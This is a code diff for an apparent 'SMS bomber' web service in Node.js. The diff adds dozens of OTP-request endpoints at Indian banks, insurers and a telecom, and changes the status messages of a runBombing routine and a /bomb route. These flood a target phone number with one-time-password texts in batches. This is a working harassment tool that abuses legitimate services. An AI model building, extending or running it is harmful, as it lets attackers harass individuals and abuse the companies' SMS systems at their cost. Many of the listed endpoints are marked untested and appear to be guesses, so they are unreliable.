+        url: "https://www.kotak.com/api/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"phone": phone})
+    },
+    {
+        name: "Axis Bank SMS",
+        url: "https://www.axisbank.com/api/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "ICICI Bank SMS",
+        url: "https://www.icicibank.com/api/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "HDFC Bank SMS",
+        url: "https://www.hdfcbank.com/api/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "SBI SMS",
+        url: "https://www.sbi.co.in/api/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "Yes Bank SMS",
+        url: "https://www.yesbank.in/api/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "IndusInd SMS",
+        url: "https://www.indusind.com/api/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "IDFC First SMS",
+        url: "https://www.idfcfirstbank.com/api/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "AU Bank SMS",
+        url: "https://www.aubank.in/api/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "RBL Bank SMS",
+        url: "https://www.rblbank.com/api/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "Bandhan Bank SMS",
+        url: "https://www.bandhanbank.com/api/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "Federal Bank SMS",
+        url: "https://www.federalbank.co.in/api/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "Canara Bank SMS",
+        url: "https://www.canarabank.com/api/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "Bank of Baroda SMS",
+        url: "https://www.bankofbaroda.in/api/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "Indian Bank SMS",
+        url: "https://www.indianbank.in/api/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "Central Bank SMS",
+        url: "https://www.centralbankofindia.co.in/api/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "Bank of India SMS",
+        url: "https://www.bankofindia.co.in/api/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "PSB Bank SMS",
+        url: "https://www.psbindia.com/api/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+
+    // ============================================================
+    // 🛡️ INSURANCE APIS (Untested)
+    // ============================================================
+    {
+        name: "Acko SMS",
+        url: "https://www.acko.com/api/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "Bajaj Allianz SMS",
+        url: "https://www.bajajallianz.com/api/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "Max Bupa SMS",
+        url: "https://www.maxbupa.com/api/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+    {
+        name: "Kotak Life SMS",
+        url: "https://www.kotaklife.com/api/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
+    },
+
+    // ============================================================
+    // 📱 TELECOM APIS (Untested)
+    // ============================================================
+    {
+        name: "MyVi SMS",
+        url: "https://www.myvi.in/otp",
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        data: (phone) => JSON.stringify({"mobile": phone})
     }
 ];
 
@@ -996,7 +2731,7 @@ async function runBombing(phone, effectiveDuration) {
         [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
     }
 
-    console.log(`📋 Total Working APIs: ${shuffled.length}`);
+    console.log(`📋 Total APIs: ${shuffled.length}`);
 
     let sent = 0;
     const BATCH_SIZE = 5;
@@ -1043,7 +2778,7 @@ app.get('/', (req, res) => {
         status: 'ok',
         instance: process.env.INSTANCE_NAME || 'api',
         total_apis: APIS.length,
-        note: 'Only WORKING APIs (2xx Success)',
+        note: 'Working (85) + Untested (new) APIs merged',
         max_duration_min: MAX_DURATION_MIN,
         uptime: Math.round(process.uptime()) + 's'
     });
@@ -1067,6 +2802,7 @@ app.get('/test', async (req, res) => {
     res.json({ phone, total: results.length, working, results });
 });
 
+// 🔥 MAIN STATS ROUTE
 app.get('/stats', (req, res) => {
     const arr = Object.values(stats).map(s => {
         let status = 'NEVER TESTED';
@@ -1157,7 +2893,7 @@ app.post('/bomb', async (req, res) => {
 app.get('/apis', (req, res) => {
     res.json({
         total: APIS.length,
-        note: 'Only WORKING APIs (2xx Success)',
+        note: 'Working (85) + Untested APIs merged',
         api_names: APIS.map(a => a.name)
     });
 });
@@ -1166,7 +2902,7 @@ const PORT = process.env.PORT || 10000;
 app.listen(PORT, '0.0.0.0', () => {
     console.log('═══════════════════════════════════════════');
     console.log(`🚀 API Server on port ${PORT}`);
-    console.log(`📊 Total WORKING APIs: ${APIS.length}`);
+    console.log(`📊 Total APIs: ${APIS.length}`);
     console.log(`⏱️ Max duration: ${MAX_DURATION_MIN} min`);
     console.log('═══════════════════════════════════════════');
     console.log('Endpoints:');
